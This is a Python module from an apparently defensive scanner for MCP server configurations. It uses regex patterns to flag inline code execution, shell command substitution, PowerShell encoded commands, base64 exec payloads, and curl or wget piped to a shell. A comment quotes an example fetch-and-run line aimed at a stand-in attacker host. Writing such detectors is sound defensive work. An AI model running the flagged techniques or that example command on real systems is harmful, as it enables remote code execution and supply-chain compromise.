import re
import base64
from ..models import Finding, Severity, OWASPCategory
from ..parser import MCPServer

# EX-001: Inline code execution injected as argument values
# Detects code being run via shell flags or eval-family calls
_INLINE_EXEC_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r'python[23]?\s+-[cC]\s+["\']'), "Python -c inline execution"),
    (re.compile(r'node\s+-e\s+["\']'), "Node.js -e inline execution"),
    (re.compile(r'(?:bash|sh|zsh|fish)\s+-[cC]\s+["\']'), "Shell -c inline execution"),
    (re.compile(r'\beval\s*\('), "eval() function call"),
    (re.compile(r'\bexec\s*\('), "exec() function call"),
    (re.compile(r'__import__\s*\('), "Python __import__() bypass"),
    (re.compile(r'os\.system\s*\('), "os.system() shell call"),
    (re.compile(r'subprocess\s*\.\s*(call|run|Popen|check_output)\s*\('), "subprocess execution call"),
    (re.compile(r'require\s*\(\s*["\']child_process'), "Node.js child_process require"),
    (re.compile(r'Runtime\.getRuntime\(\)\.exec\s*\('), "Java Runtime.exec() call"),
    (re.compile(r'Process\s*\(\s*["\']'), "Python Process() execution"),
]

# EX-003: PowerShell encoded command (universally malicious in MCP configs)
# -EncodedCommand BASE64 / -e BASE64 / -ec BASE64 — hides arbitrary PowerShell payload from detection.
# No legitimate MCP server uses this technique.
_PS_ENCODED_CMD_FLAGS = re.compile(
    r'(?i)-(?:EncodedCommand|ec|e|en|enc|enco|encod)\b',
)
_BASE64_PAYLOAD_RE = re.compile(r'^[A-Za-z0-9+/]{20,}={0,2}$')

# EX-003: Remote script download-and-execute (curl/wget pipe to shell)
# e.g. "curl https://evil.com/install.sh | bash" — downloads and executes without verification
_CURL_PIPE_SHELL_RE = re.compile(
    r'(?i)(curl|wget)\s+.*?\|\s*(bash|sh|python|python3|node|perl|ruby)\b'
)

# EX-002: Command substitution / injection in argument strings
_CMD_SUBSTITUTION_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r'\$\([^)]+\)'), "Shell command substitution $()"),
    (re.compile(r'`[^`]{2,}`'), "Backtick command substitution"),
    (re.compile(r'\{\{[^}]{3,}\}\}'), "Template injection pattern {{}}"),
    (re.compile(r'<\([^)]+\)'), "Process substitution <()"),
    (re.compile(r';\s*(?:rm|curl|wget|nc|bash|sh|python|node)\s'), "Chained shell command injection"),
    (re.compile(r'\|\s*(?:bash|sh|python|node|perl|ruby)\b'), "Pipe to shell interpreter"),
]


def check_code_execution(server: MCPServer) -> list[Finding]:
    findings: list[Finding] = []
    seen: set[str] = set()

    for i, arg in enumerate(server.args):
        dedup_prefix = f"{server.name}:{i}"

        # EX-001: Inline code execution
        for pattern, description in _INLINE_EXEC_PATTERNS:
            match = pattern.search(arg)
            if match:
                key = f"EX-001:{dedup_prefix}"
                if key not in seen:
                    seen.add(key)
                    snippet = arg[:120] + ("..." if len(arg) > 120 else "")
                    findings.append(Finding(
                        check_id="EX-001",
                        title=f"Inline code execution in server arg #{i+1}: {description}",
                        detail=(
                            f"Server `{server.name}` passes argument #{i+1} containing what appears to be "
                            f"inline code execution ({description}): `{snippet}`. "
                            "Injecting executable code as MCP configuration arguments is a hallmark of "
                            "supply chain and prompt injection attacks. Legitimate MCP servers do not "
                            "require inline code in their arguments."
                        ),
                        severity=Severity.CRITICAL,
                        owasp=OWASPCategory.MCP05,
                        server_name=server.name,
                        remediation=(
                            "Remove any inline code from server arguments immediately. "
                            "MCP server arguments should only contain configuration values "
                            "(paths, flags, package names), never executable code. "
                            "If this server was installed from an untrusted source, remove it entirely."
                        ),
                        engine="custom",
                    ))
                break

        # EX-002: Command substitution / injection
        for pattern, description in _CMD_SUBSTITUTION_PATTERNS:
            match = pattern.search(arg)
            if match:
                key = f"EX-002:{dedup_prefix}"
                if key not in seen:
                    seen.add(key)
                    snippet = arg[:120] + ("..." if len(arg) > 120 else "")
                    findings.append(Finding(
                        check_id="EX-002",
                        title=f"Command substitution injection in server arg #{i+1}: {description}",
                        detail=(
                            f"Server `{server.name}` argument #{i+1} contains a command substitution pattern "
                            f"({description}): `{snippet}`. "
                            "Shell command substitution in MCP config arguments can execute arbitrary commands "
                            "when the config is processed by the MCP runtime."
                        ),
                        severity=Severity.HIGH,
                        owasp=OWASPCategory.MCP05,
                        server_name=server.name,
                        remediation=(
                            "Remove all command substitution syntax from server arguments. "
                            "MCP configs should not contain shell-expansion syntax (`$()`, backticks, etc.). "
                            "Use environment variables for dynamic values instead."
                        ),
                        engine="custom",
                    ))
                break

    # EX-003a: PowerShell encoded command in args
    # Pattern: [..., "-EncodedCommand", "BASE64PAYLOAD", ...] or [..., "-e", "BASE64", ...]
    # The flag and payload may be in adjacent args or combined (--flag=payload).
    ps_flag_idx: int | None = None
    for i, arg in enumerate(server.args):
        if _PS_ENCODED_CMD_FLAGS.fullmatch(arg.strip()):
            ps_flag_idx = i
        elif ps_flag_idx is not None and _BASE64_PAYLOAD_RE.match(arg.strip()):
            # Try to decode the payload to include a preview in the finding
            try:
                decoded = base64.b64decode(arg.strip()).decode("utf-16-le", errors="replace")[:80]
            except Exception:
                decoded = arg[:80]
            key = f"EX-003:ps:{server.name}"
            if key not in seen:
                seen.add(key)
                findings.append(Finding(
                    check_id="EX-003",
                    title="PowerShell encoded command detected (obfuscated payload)",
                    detail=(
                        f"Server `{server.name}` uses a PowerShell `-EncodedCommand` (or equivalent) flag "
                        f"in argument #{ps_flag_idx+1}, followed by a Base64 payload in argument #{i+1}. "
                        f"Decoded preview: `{decoded!r}`. "
                        "Base64-encoded PowerShell is the most common technique for hiding malicious "
                        "commands from static detection. No legitimate MCP server requires this pattern."
                    ),
                    severity=Severity.CRITICAL,
                    owasp=OWASPCategory.MCP05,
                    server_name=server.name,
                    remediation=(
                        "Immediately remove this server from your config. "
                        "Decode the Base64 payload to understand what it executes, then investigate "
                        "how the server was installed. Report to the package maintainer if it was installed "
                        "from a registry."
                    ),
                    engine="custom",
                    attack_tactic="defense-evasion",
                    cwe_id="CWE-116",
                ))
            break
        else:
            ps_flag_idx = None  # reset if payload not immediately following

    # EX-003b: curl/wget pipe to shell in any arg (supply chain download-and-execute)
    full_args_joined = " ".join(server.args)
    match = _CURL_PIPE_SHELL_RE.search(full_args_joined)
    if match:
        key = f"EX-003:curl:{server.name}"
        if key not in seen:
            seen.add(key)
            findings.append(Finding(
                check_id="EX-003",
                title="Remote script download-and-execute (curl/wget pipe to shell)",
                detail=(
                    f"Server `{server.name}` appears to download and immediately execute a remote script: "
                    f"`{match.group(0)!r}`. "
                    "curl/wget piped to bash/sh/python fetches arbitrary code from a remote URL "
                    "and executes it in one step, with no verification or review. "
                    "This is one of the most common supply chain attack techniques."
                ),
                severity=Severity.CRITICAL,
                owasp=OWASPCategory.MCP05,
                server_name=server.name,
                remediation=(
                    "Download the script first, inspect its contents, then execute it manually. "
                    "Never pipe a remote URL directly into a shell interpreter. "
                    "Verify the script's integrity with a checksum before running."
                ),
                engine="custom",
                attack_tactic="execution",
                cwe_id="CWE-494",
            ))

    # EX-003c: Python base64 decode-and-execute (obfuscated Python payload)
    # Analogous to EX-003a (PowerShell -EncodedCommand) but for Python.
    # Pattern: exec(base64.b64decode('PAYLOAD')) or eval(base64.b64decode(...))
    # Decode and show a preview in the finding, just like EX-003a.
    _PY_B64_EXEC_RE = re.compile(
        r'(?:exec|eval)\s*\(\s*(?:base64\.b64decode|__import__\(["\']base64["\']\)'
        r'\.b64decode|codecs\.decode)\s*\(\s*["\']([A-Za-z0-9+/]{20,}={0,2})["\']',
        re.I,
    )
    for arg in server.args:
        m = _PY_B64_EXEC_RE.search(arg)
        if m:
            b64_payload = m.group(1)
            try:
                decoded = base64.b64decode(b64_payload).decode("utf-8", errors="replace")[:80]
            except Exception:
                decoded = b64_payload[:80]
            key = f"EX-003:pyb64:{server.name}"
            if key not in seen:
                seen.add(key)
                findings.append(Finding(
                    check_id="EX-003",
                    title="Python base64 decode-and-execute detected (obfuscated payload)",
                    detail=(
                        f"Server `{server.name}` contains a `exec(base64.b64decode(...))` pattern "
                        "— the Python equivalent of PowerShell -EncodedCommand. "
                        f"Decoded payload preview: `{decoded!r}`. "
                        "This is a classic payload obfuscation technique used to hide malicious "
                        "Python code from static scanners. No legitimate MCP server config "
                        "requires runtime base64 decoding of executable code."
                    ),
                    severity=Severity.CRITICAL,
                    owasp=OWASPCategory.MCP05,
                    server_name=server.name,
                    remediation=(
                        "Remove this server immediately. Decode the base64 payload manually "
                        "(python3 -c \"import base64; print(base64.b64decode('<payload>').decode())\") "
                        "to understand what it executes, then report to the package maintainer."
                    ),
                    engine="custom",
                    attack_tactic="defense-evasion",
                    cwe_id="CWE-116",
                ))
            break

    return findings
